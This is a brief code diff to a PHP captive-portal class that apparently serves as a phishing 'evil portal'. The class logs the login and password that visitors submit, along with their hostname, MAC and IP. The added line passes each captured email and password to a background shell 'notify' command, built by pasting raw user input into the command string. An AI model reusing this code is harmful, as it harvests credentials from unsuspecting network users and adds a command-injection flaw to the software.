@@ -46,6 +46,7 @@ class MyPortal extends Portal
             $mac = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
             $ip = isset($_POST['ip']) ? $_POST['ip'] : 'ip';
             $this->writeLog("[" . date('Y-m-d H:i:s') . "Z]\n" . "login: {$email}\npassword: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
+            $this->execBackground("notify $email' - '$pwd");
         }
         // handle form input or other extra things there
 
